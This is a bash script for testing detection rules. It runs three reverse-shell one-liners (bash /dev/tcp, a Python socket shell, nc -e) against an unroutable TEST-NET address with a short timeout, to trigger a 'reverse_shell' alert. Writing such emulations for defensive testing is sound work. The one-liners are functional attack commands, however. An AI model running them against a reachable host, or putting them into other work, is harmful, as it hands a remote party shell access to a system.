#!/usr/bin/env bash
# revshell.sh - benign emulation of a reverse shell for detection-rule testing.
#
# What an attacker does: open an interactive shell back to a C2 with a one-liner (bash /dev/tcp, a
# Python socket shell, nc -e). This does the harmless analogue: it runs the SAME one-liners against
# an UNROUTABLE TEST-NET address with a short timeout, so the connection never establishes and no
# shell is ever handed to anyone. The audit event - the attempt - is identical to the real thing;
# the outcome is a timeout. See ./README.md.
#
# Imitates: generic reverse-shell one-liners (bash /dev/tcp, python socket, nc -e)
# Expected rules: reverse_shell
set -u

# 192.0.2.30 is TEST-NET-1 (RFC 5737): unroutable. Every attempt below times out with no peer.

# --- TTP: bash /dev/tcp reverse shell -> reverse_shell (bash_devtcp) ---
timeout 2 bash -c 'bash -i >& /dev/tcp/192.0.2.30/4444 0>&1' >/dev/null 2>&1 || true

# --- TTP: python socket reverse shell -> reverse_shell (python_socket) ---
if command -v python3 >/dev/null 2>&1; then
	timeout 2 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.0.2.30",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])' >/dev/null 2>&1 || true
fi

# --- TTP: nc with an exec -> reverse_shell (nc_exec) ---
if command -v nc >/dev/null 2>&1; then
	timeout 2 nc -e /bin/sh 192.0.2.30 4444 >/dev/null 2>&1 || true
fi

exit 0
